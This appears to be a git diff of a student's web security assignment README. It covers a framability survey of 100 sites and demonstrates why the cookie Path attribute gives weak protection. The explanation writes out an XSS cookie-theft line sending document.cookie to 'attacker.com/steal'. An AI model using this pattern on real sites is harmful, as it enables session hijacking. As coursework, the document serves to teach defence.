@@ -4,9 +4,17 @@
 
 ### List of directories and files
 
-* [HTTP_reponse_headers](HTTP_reponse_headers) - contains response headers obtained for 100 sites
-* [code](code) - contains scripts and output files 
-* [framable](framable) - contains html files created for 100 sites
+* [HTTP_reponse_headers](HTTP_reponse_headers) - contains response headers obtained for 100 sites.
+* [code](code) - contains scripts and output files used to analyze which sites are framable.
+* [framable](framable) - contains html files created for 100 sites.
+
+### Youtube video for framable is available at: https://youtu.be/QLgFOZIHSOI
+
+### Summary
+
+* Number of framable sites - 28
+* Number of non framable sites - 69
+* number of sites did not resolve - 3
 
 * Framable sites out of 100 sites
 
@@ -41,6 +49,8 @@
 | 26 | wikimedia.org       |
 | 27 | www.livejournal.com |
 
+
+* Screenshot of a framable site
 
 <kbd><img src="screenshots/iframe_loaded.png" width="700" ></kbd>
 
@@ -121,31 +131,30 @@
 ​
 ​
 
-* Within the non-framable category four site were observed wihtout a proper reason. The four site with reason "nan" have not set x-frame-options, content security policy, and no status code observed which prevent the page loading.
+* Within the non-framable category, four sites were observed wihtout a proper reason to explain that how they defeat the attempt for framing. The four sites with reason "nan" have not set x-frame-options, content security policy, and no status code was observed which prevent the page loading inside the iframe.
+
+* Screenshot of a non-framable site
 
 <kbd><img src="screenshots/iframe_not_loaded.png" width="700" ></kbd>
-
-### Summary
-
-* Number of framable sites - 28
-* Number of non framable sites - 69
-* number of sites did not resolve - 3
 
 
  ## Question 2 - Frame path attack
  
  ### How the Path attribute for Cookies is not suitable for security
 
- * Example for limited protection against cross-site-scripting attacks.
+ **Example for limited protection against cross-site-scripting attacks.**
 
-   Consider a website where users can post comments. The website sets a session cookie with a specific Path attribute ("/user") upon user login.
+   Consider a website where users can post comments. The website sets a session cookie with a specific Path attribute ("/user") upon 
+user login.
 
-   **Set-Cookie: sessionId=123; Path=/user*
+  ***Set-Cookie: sessionId=123; Path=/user***
    
-In this case, a script is injected by an attacker into the insecure.html page on the same domain, but it is not located inside the "/user" path. The injected script steal the user's session cookie to a domain under the control of the attacker.
+   In this case, a script is injected by an attacker into the insecure.html page on the same domain, but it is not located inside the 
+   "/user" path. The injected script steal the user's session cookie to a domain under the control of the attacker.
 
-*Insecure html page
+ * Insecure html page
 
+ ```
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -161,23 +170,77 @@ In this case, a script is injected by an attacker into the insecure.html page on
     </script>
 </body>
 </html>
+ ```
 
- * Example futher explained.
-
--The server tries to restrict access to pages under the "/user" path by setting the sessionId cookie with a Path attribute of "/user". 
--Then the attacker injects a script into a different page (insecure.html) that runs in the user's browser. This script accesses the document.cookie property, which includes all accessible cookies, regardless of the Path attribute.
--The image object created byy the inected script appends the user's cookie to the image URL. This URL points to a server controlled by the attacker **(https://attacker.com/steal?cookie= + document.cookie)* .
--When the user visits the insecure.html page, the injected script runs, sending the user's session cookie to the attacker's server.
+ **Example futher explained**
+ 
+- The server tries to restrict access to pages under the "/user" path by setting the sessionId cookie with a Path attribute of "/user". 
+- Then the attacker injects a script into a different page (insecure.html) that runs in the user's browser. This script accesses the document.cookie property, which includes all accessible cookies, regardless of the Path attribute.
+- The image object created byy the inected script appends the user's cookie to the image URL. This URL points to a server controlled by the attacker *(https://attacker.com/steal?cookie= + document.cookie)* .
+- When the user visits the insecure.html page, the injected script runs, sending the user's session cookie to the attacker's server.
 
   
  ### How a parent page can steal cookies from an iframed page if only the Path attribute is used in Set-Cookie.
 
  ### List of files
 
- * [child.html](child.html) - html page with a cookie and which is being framed by parent page
- * [parent.html](parent.html) - html page which steal cookie from child page
- * [index_c.js](index_c.js) - server used to render child.html
- * [index_p.js](index_p.js) - server used to render parent.html
+ * [child.html](frame-path-attack/child.html) - html page with a cookie and which is being framed by parent page
+ * [parent.html](frame-path-attack/parent.html) - html page which steal cookie from child page
+ * [index_c.js](frame-path-attack/index_c.js) - server used to render child.html
+ * [index_p.js](frame-path-attack/index_p.js) - server used to render parent.html
+
+ ### Youtube video for frame-path-attack is available at: https://youtu.be/FRpULEejpPA   
+
+ * child.html page with a cookie having path attribute.
+
+
+  ```
+   <!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Iframed Page</title>
+</head>
+
+<body>
+    <h1>Child page</h1>
+    <script>
+        document.cookie = "insecureCookie=456; Path=/";
+    </script>
+</body>
+
+</html>
+  ```
+
+   
+ * parent.html page trying to steal the cookie by framing child.html
+   
+
+ ```
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Parent Page</title>
+</head>
+
+<body>
+    <h1>Parent page</h1>
+    <iframe src="http://localhost:8001"></iframe>
+    <script>
+        // Attempt to read cookies from the iframed page
+        const cookies = document.cookie;
+        console.log("cookies found");
+        alert("cookies found");
+        console.log("Cookies from iframed page:", cookies);
+
+    </script>
+</body>
+
+</html>
+ ```
 
  * Screenshot of child.html
    
@@ -185,4 +248,12 @@ In this case, a script is injected by an attacker into the insecure.html page on
 
  * Screenshot of parent.html with stolen cookie.
 
-  <kbd><img src="screenshots/parent_page with _stolen_cookie.png" width="700" ></kbd>  
+  <kbd><img src="screenshots/parent_page with _stolen_cookie.png" width="700" ></kbd>
+
+  ### Extra credit - Week 5 slide 65 literary reference in the title
+
+  In programming parser is a module or a component in the software that analyses the structure and the syntax of a source code or input data. Parsing is commonly used in compilers, intepreters, and data validation. 
+  
+  The slide reference is mainly focused on syntax analysis of input data. When a parser runs the input will be tokenized and tokens are then organized in a hierarchical structure.
+  
+  When building applications, first the HTML parser runs and search for the valid html tags and create the DOM(Document Objject Model) tree. Then the javascript parser runs and search for <script> tags and executes them. next CSS parser runs and search for <style> tags and execute the <style > tags accordingly.
